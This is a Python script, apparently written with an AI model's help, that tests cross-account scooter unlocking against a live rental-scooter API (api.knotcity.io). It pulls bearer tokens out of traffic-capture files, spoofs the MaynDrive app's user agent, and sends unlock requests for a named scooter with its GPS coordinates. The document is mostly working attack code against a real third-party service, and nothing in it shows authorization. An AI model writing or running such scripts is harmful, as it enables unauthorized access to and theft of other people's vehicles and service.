#!/usr/bin/env python3
"""
Test Cross-Account Scooter Access with Fresh Token
Using the fresh token from your capture
"""

import requests
import json
import time
from datetime import datetime

# Fresh token from your capture (truncated in your message)
# We need the COMPLETE token - please provide the full token
FRESH_TOKEN = "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjox..."

# API Configuration
BASE_URL = "https://api.knotcity.io"
UNLOCK_ENDPOINT = "/api/application/vehicles/unlock"
LOCK_ENDPOINT = "/api/application/vehicles/freefloat/lock"

# Test scooter data
SXB306_SCOOTER = {
    "serial": "SXB306",
    "lat": 47.3903912328159,  # From your capture data
    "lng": 0.6889144890010357
}

def test_token_validity(token):
    """Test if the token is valid"""
    print("[TEST] Testing token validity...")
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
        "Accept": "application/json"
    }
    
    try:
        response = requests.get(f"{BASE_URL}/api/application/vehicles", headers=headers, timeout=10)
        print(f"   Status: {response.status_code}")
        if response.status_code in [200, 404]:
            print("[OK] Token is VALID!")
            return True
        else:
            print(f"[ERROR] Token invalid: {response.status_code}")
            return False
    except Exception as e:
        print(f"[ERROR] Error testing token: {e}")
        return False

def attack_sxb306_unlock(token):
    """Attempt to unlock SXB306 using the fresh token"""
    print(f"[ATTACK] Attempting to unlock SXB306 using fresh token...")
    print(f"   Scooter: {SXB306_SCOOTER['serial']}")
    print(f"   Location: {SXB306_SCOOTER['lat']}, {SXB306_SCOOTER['lng']}")
    
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "MaynDrive/1.1.34 (Android; Mobile)",
        "Accept": "application/json"
    }
    
    payload = {
        "serial_number": SXB306_SCOOTER["serial"],
        "lat": SXB306_SCOOTER["lat"],
        "lng": SXB306_SCOOTER["lng"]
    }
    
    try:
        response = requests.post(f"{BASE_URL}{UNLOCK_ENDPOINT}", 
                               headers=headers, 
                               json=payload, 
                               timeout=15)
        
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print("[CRITICAL] VULNERABILITY CONFIRMED!")
            print("[CRITICAL] Fresh token can unlock SXB306 scooter!")
            print("[CRITICAL] This indicates CROSS-ACCOUNT SCOOTER ACCESS!")
            return True
        elif response.status_code == 403:
            print("[OK] Good: Permission denied (proper access control)")
            print("[OK] Fresh token cannot access SXB306 scooter")
            return False
        elif response.status_code == 400:
            print("[ERROR] Bad request - checking error details...")
            try:
                error_data = response.json()
                print(f"   Error: {error_data}")
            except:
                print(f"   Raw error: {response.text}")
            return False
        else:
            print(f"[ERROR] Unexpected response: {response.status_code}")
            return False
            
    except Exception as e:
        print(f"[ERROR] Error during SXB306 unlock test: {e}")
        return False

def extract_latest_token():
    """Automatically extract the latest token from capture files"""
    print("[SEARCH] Automatically extracting latest token...")
    
    # Try to read from LATEST_TOKEN.txt first
    try:
        with open('LATEST_TOKEN.txt', 'r', encoding='utf-8') as f:
            token = f.read().strip()
        if token and token.startswith('Bearer '):
            print(f"[OK] Found latest token: {token[:50]}...")
            return token
    except FileNotFoundError:
        print("   LATEST_TOKEN.txt not found")
    except Exception as e:
        print(f"   Error reading LATEST_TOKEN.txt: {e}")
    
    # Fallback: try to extract from capture files
    capture_files = [
        'CAPTURED_NEW_ACCOUNT.txt',
        'CAPTURED_WORKING_FINAL.txt', 
        'CAPTURED_API_DECRYPT.txt',
        'CAPTURED_API.txt'
    ]
    
    for filename in capture_files:
        try:
            print(f"   Checking {filename}...")
            with open(filename, 'r', encoding='utf-8') as f:
                content = f.read()
            
            # Look for Bearer tokens in the content
            import re
            bearer_pattern = r'Bearer eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
            tokens = re.findall(bearer_pattern, content)
            
            if tokens:
                # Get the most recent token (last one found)
                token = tokens[-1]
                print(f"[OK] Found token in {filename}: {token[:50]}...")
                return token
            else:
                print(f"   No Bearer tokens found in {filename}")
                
        except FileNotFoundError:
            print(f"   {filename} not found")
            continue
        except Exception as e:
            print(f"   Error reading {filename}: {e}")
            continue
    
    print("[ERROR] No Bearer tokens found in any capture files")
    return None

def main():
    print("=" * 80)
    print("[WARNING] CROSS-ACCOUNT SCOOTER ACCESS TEST (AUTO TOKEN)")
    print("=" * 80)
    print("[!] WARNING: Testing if fresh token can unlock SXB306!")
    print("=" * 80)
    
    # Automatically extract the latest token
    fresh_token = extract_latest_token()
    
    if not fresh_token:
        print("\n📝 Manual token entry:")
        print("   (Copy from your capture output)")
        fresh_token = input("Enter the COMPLETE Bearer token: ").strip()
        
        if not fresh_token.startswith("Bearer "):
            fresh_token = "Bearer " + fresh_token
    else:
        print(f"\n[OK] Using automatically extracted token")
    
    # Test 1: Validate token
    print("\n[1] TOKEN VALIDATION")
    print("-" * 40)
    if not test_token_validity(fresh_token):
        print("[ERROR] Cannot proceed - token is invalid")
        return
    
    # Test 2: SXB306 unlock attempt
    print("\n[2] SXB306 UNLOCK TEST")
    print("-" * 40)
    success = attack_sxb306_unlock(fresh_token)
    
    # Test 3: Security analysis
    print("\n[3] SECURITY ANALYSIS")
    print("-" * 40)
    
    if success:
        print("[CRITICAL] VULNERABILITY CONFIRMED!")
        print("[CRITICAL] CROSS-ACCOUNT SCOOTER ACCESS IS POSSIBLE!")
        print("[CRITICAL] Fresh token can unlock scooters from other accounts!")
        print("\n[IMPACT] Assessment:")
        print("   - Severity: CRITICAL")
        print("   - Scope: Cross-account scooter access")
        print("   - Exploitability: High")
        print("   - Business Impact: Severe")
    else:
        print("[OK] GOOD: Cross-account access is properly blocked")
        print("[OK] Fresh token cannot access SXB306 scooter")
        print("\n[ASSESSMENT] Security Assessment:")
        print("   - Severity: LOW (proper access control)")
        print("   - Scope: User-specific access only")
        print("   - Exploitability: Low")
        print("   - Business Impact: Minimal")
    
    print("\n" + "=" * 80)
    print("🎯 TEST COMPLETE")
    print("=" * 80)

if __name__ == "__main__":
    main()
